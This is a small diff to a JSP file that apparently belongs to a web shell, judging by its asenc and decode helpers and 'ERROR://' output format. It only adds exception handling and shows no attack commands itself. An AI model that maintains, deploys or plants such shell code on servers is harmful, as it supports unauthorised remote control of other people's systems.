@@ -383,7 +383,7 @@ ChangeLog:
         return fileHexContext;
     }
 
-    String asenc(String str, String decode){
+    String asenc(String str, String decode) throws Exception{
         if(decode.equals("hex") || decode=="hex"){
             String ret = "";
             for (int i = 0; i < str.length(); i++) {
@@ -552,7 +552,11 @@ ChangeLog:
     } catch (Exception e) {
         sb.append("ERROR" + ":// " + e.toString());
     }
-    output.append(asenc(sb.toString(), decoder));
+    try {
+        output.append(asenc(sb.toString(), decoder));
+    }catch (Exception e) {
+        sb.append("ERROR" + ":// " + e.toString());
+    }
     output.append(decode(RetE, "base64"));
     out.print(output.toString());
 %>
